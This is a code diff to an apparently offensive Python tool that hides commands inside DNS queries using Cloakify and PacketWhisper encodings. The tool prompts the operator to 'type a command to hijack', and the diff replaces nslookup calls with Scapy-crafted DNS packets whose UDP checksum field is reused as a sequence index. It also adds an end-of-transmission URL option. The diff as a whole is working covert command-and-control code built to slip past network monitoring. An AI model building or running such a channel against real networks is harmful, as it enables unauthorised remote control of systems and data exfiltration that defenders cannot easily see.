@@ -6,6 +6,7 @@ from aes_encrypt import decrypt_message, encrypt_message
 from cloakify import Cloakify
 from packetWhisper import ExtractDNSQueriesFromPCAP, ExtractPayloadFromDNSQueries, TransferCloakedFile
 from dns_server import start_udp_server
+from scapy.all import *
 import signal
 
 def clear_files_on_exit(signum, frame):
@@ -32,12 +33,20 @@ def send_command(command, dns='localhost', args=None):
     if not os.path.exists(cloaked_command):
         print("Error: file `cloaked_command.txt` not created. (Please check permissions)")
         return
+    
+    fqdn_array = []
+    with open(cloaked_command, 'r') as file:
+        fqdn_array = [line.strip() for line in file]
 
-    # Send command using dns requests
+
+    # Send command using dns requests, the checksum is the index of the fqdn in the array so that the receiver can check if any packets are missing
     with open(cloaked_command, 'r') as file:
         for fqdn in file:
             fqdn_str = fqdn.strip()
-            subprocess.call(['nslookup', fqdn_str, dns], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            dns_packet = IP(dst=dns)/UDP()/DNS(rd=1, qd=DNSQR(qname=fqdn_str))
+            dns_packet[UDP].chksum = fqdn_array.index(fqdn_str)
+            send(dns_packet, verbose=fqdn_array.index(fqdn_str))
+            #subprocess.call(['nslookup', fqdn_str, dns], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
     # Remove command file
     #os.remove(cloaked_command)
@@ -138,6 +147,7 @@ i@@m               '///|-     >f^    |/   }rnf,                   B@@'
     )
     parser.add_argument('--local', action='store_true', help="If both sender and receiver are on the same LAN, use this flag to capture the pcap locally.") 
     parser.add_argument('--encrypt', action='store_true', help="Use this flag if you want to use an encrypted communication.") 
+    parser.add_argument('--EOT_url', type=str, help="End of Transmission URL")
     args = parser.parse_args()
     
     
@@ -145,6 +155,8 @@ i@@m               '///|-     >f^    |/   }rnf,                   B@@'
     print("Type a command to hijack below:")
     subprocess.Popen(['python', 'dns_server.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     while True:
+        if args.EOT_url:
+           os.environ['EOT_URL'] = args.EOT_url
         if args.dns:
             dns = args.dns
         command = input("> ")
